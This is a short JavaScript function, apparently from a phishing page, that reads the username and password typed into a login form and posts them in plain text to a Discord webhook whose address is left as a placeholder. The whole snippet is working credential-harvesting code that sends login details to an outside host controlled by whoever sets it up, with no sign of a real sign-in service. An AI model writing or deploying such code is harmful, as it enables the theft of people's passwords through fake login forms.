function saveLogin() {
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  // Create a new XMLHttpRequest object
  const xhttp = new XMLHttpRequest();

  // Set the request method to POST and the URL to the Discord webhook
  xhttp.open("POST", "https://discord.com/api/webhooks/YOURWEBHOOKHERE", true);

  // Define the callback function for when the response is received
  xhttp.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      console.log(this.responseText);
    }
  };

  // Set the Content-Type header to application/json
  xhttp.setRequestHeader("Content-Type", "application/json");

  // Send the request with the data in JSON format
  const data = {
    content: "Username: " + username + "\nPassword: " + password,
  };
  xhttp.send(JSON.stringify(data));
}
